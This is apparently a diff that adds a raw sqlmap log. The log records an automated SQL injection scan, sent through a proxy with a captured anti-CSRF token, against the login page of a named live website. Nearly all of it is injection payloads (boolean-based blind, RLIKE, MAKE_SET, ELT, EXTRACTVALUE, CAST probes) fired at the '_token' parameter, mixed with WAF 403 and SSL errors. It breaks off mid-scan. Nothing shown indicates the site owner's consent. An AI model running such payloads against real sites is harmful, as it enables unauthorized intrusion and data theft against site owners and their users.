@@ -1,0 +1,1205 @@
+Proxy PID: 75582
+Proxy running on port 8080
+CSRF: plCFrE8OyRAh2999n5MJrgGkwl2G4v...
+Request file: /tmp/sqlmap_req.txt
+
+=== Running sqlmap through proxy ===
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.10.10#pip}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:24:32 /2026-10-24/
+
+[08:24:32] [INFO] parsing HTTP request from '/tmp/sqlmap_req.txt'
+[08:24:32] [DEBUG] cleaning up configuration parameters
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:24:32] [DEBUG] setting the HTTP timeout
+[08:24:32] [DEBUG] setting the HTTP User-Agent header
+[08:24:32] [DEBUG] setting the HTTP/SOCKS proxy for all HTTP requests
+[08:24:32] [DEBUG] creating HTTP requests opener object
+it appears that provided value for POST parameter 'email' has boundaries. Do you want to inject inside? ('@EMAIL*@') [y/N] N
+[08:24:32] [DEBUG] used the default behavior, running in batch mode
+POST parameter '_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[08:24:32] [DEBUG] used the default behavior, running in batch mode
+[08:24:32] [INFO] testing connection to the target URL
+[08:24:33] [DEBUG] declared web page charset 'utf-8'
+[08:24:33] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:24:33] [WARNING] potential permission problems detected ('Access denied')
+[08:24:33] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests
+[08:24:33] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+[08:24:33] [DEBUG] loading random HTTP User-Agent header(s) from file '/home/runner/.local/lib/python3.12/site-packages/sqlmap/data/txt/user-agents.txt'
+[08:24:33] [INFO] testing if the target URL content is stable
+got a 301 redirect to 'https://www.nadiavpn.web.id/login'. Do you want to follow? [Y/n] Y
+[08:24:33] [DEBUG] used the default behavior, running in batch mode
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
+[08:24:33] [DEBUG] used the default behavior, running in batch mode
+[08:24:33] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:33] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:33] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:33] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:33] [WARNING] POST parameter '_token' does not appear to be dynamic
+[08:24:33] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ).,()"),)'-- -
+[08:24:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:34] [WARNING] heuristic (basic) test shows that POST parameter '_token' might not be SQL injectable
+[08:24:34] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' 'YlAPIi<'">)tqavhe-- -
+[08:24:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:34] [INFO] testing for SQL injection on POST parameter '_token'
+[08:24:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[08:24:34] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  AND 5909=9503-- -
+[08:24:35] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:35] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:35] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:35] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:35] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  AND 9488=9488-- -
+[08:24:35] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:35] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:35] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:35] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[08:24:35] [PAYLOAD] -4056'  OR 6089=5262-- -
+[08:24:36] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:36] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:36] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:36] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:36] [PAYLOAD] -2530'  OR 9808=9808-- -
+[08:24:36] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:36] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:36] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:36] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[08:24:36] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  OR NOT 8752=5210-- -
+[08:24:37] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:37] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:37] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:37] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:37] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  OR NOT 7279=7279-- -
+[08:24:37] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:38] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:38] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:38] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[08:24:38] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  AND 1329=(SELECT (CASE WHEN (1329=5285) THEN 1329 ELSE (SELECT 5285 UNION SELECT 7755) END))-- -
+[08:24:38] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:38] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:38] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:38] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:38] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  AND 6264=(SELECT (CASE WHEN (6264=6264) THEN 6264 ELSE (SELECT 3705 UNION SELECT 5170) END))-- -
+[08:24:39] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:39] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:39] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:39] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[08:24:39] [PAYLOAD] -3186'  OR 2953=(SELECT (CASE WHEN (2953=1489) THEN 2953 ELSE (SELECT 1489 UNION SELECT 3131) END))-- -
+[08:24:39] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:39] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:39] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:39] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:39] [PAYLOAD] -6961'  OR 1039=(SELECT (CASE WHEN (1039=1039) THEN 1039 ELSE (SELECT 2472 UNION SELECT 1046) END))-- -
+[08:24:40] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:40] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:40] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:40] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[08:24:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
+[08:24:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
+[08:24:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[08:24:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[08:24:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[08:24:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[08:24:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[08:24:40] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[08:24:40] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  RLIKE (SELECT (CASE WHEN (4288=7769) THEN 0x706c43467245384f79524168323939396e354d4a7267476b776c32473476734b6168516735654b6f ELSE 0x28 END))-- -
+[08:24:40] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:40] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:40] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:40] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:40] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  RLIKE (SELECT (CASE WHEN (7220=7220) THEN 0x706c43467245384f79524168323939396e354d4a7267476b776c32473476734b6168516735654b6f ELSE 0x28 END))-- -
+[08:24:41] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:41] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:41] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:41] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:41] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[08:24:41] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  AND MAKE_SET(1097=7298,7298)-- -
+[08:24:41] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:41] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:41] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:41] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:41] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  AND MAKE_SET(9628=9628,9767)-- -
+[08:24:42] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:42] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:42] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:42] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:42] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[08:24:42] [PAYLOAD] -1512'  OR MAKE_SET(3468=2730,2730)-- -
+[08:24:42] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:42] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:42] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:42] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:42] [PAYLOAD] -8353'  OR MAKE_SET(2690=2690,2692)-- -
+[08:24:43] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:43] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:43] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:43] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:43] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[08:24:43] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  AND ELT(5609=2395,2395)-- -
+[08:24:43] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:43] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:43] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:43] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:43] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  AND ELT(6209=6209,9482)-- -
+[08:24:44] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:44] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:44] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:44] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:44] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[08:24:44] [PAYLOAD] -8374'  OR ELT(5651=8702,8702)-- -
+[08:24:45] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:45] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:45] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:45] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:45] [PAYLOAD] -2524'  OR ELT(6510=6510,3949)-- -
+[08:24:45] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:45] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:45] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:45] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:45] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[08:24:45] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  AND EXTRACTVALUE(5297,CASE WHEN (5297=2643) THEN 5297 ELSE 0x3A END)-- -
+[08:24:46] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:46] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:46] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:46] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:46] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  AND EXTRACTVALUE(1507,CASE WHEN (1507=1507) THEN 1507 ELSE 0x3A END)-- -
+[08:24:46] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:46] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:46] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:46] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:46] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[08:24:46] [PAYLOAD] -3689'  OR EXTRACTVALUE(1039,CASE WHEN (1039=6584) THEN 1039 ELSE 0x3A END)-- -
+[08:24:47] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:47] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:47] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:47] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:47] [PAYLOAD] -2076'  OR EXTRACTVALUE(6037,CASE WHEN (6037=6037) THEN 6037 ELSE 0x3A END)-- -
+[08:24:47] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:47] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:47] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:47] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:47] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[08:24:47] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  AND (SELECT (CASE WHEN (8622=2101) THEN NULL ELSE CAST((CHR(84)||CHR(83)||CHR(74)||CHR(73)) AS NUMERIC) END)) IS NULL-- -
+[08:24:48] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:48] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:48] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:48] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:48] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  AND (SELECT (CASE WHEN (6919=6919) THEN NULL ELSE CAST((CHR(70)||CHR(89)||CHR(106)||CHR(111)) AS NUMERIC) END)) IS NULL-- -
+[08:24:48] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:48] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:48] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:48] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:48] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
+[08:24:48] [PAYLOAD] -3408'  OR (SELECT (CASE WHEN (9183=1442) THEN NULL ELSE CAST((CHR(71)||CHR(109)||CHR(74)||CHR(73)) AS NUMERIC) END)) IS NULL-- -
+[08:24:49] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
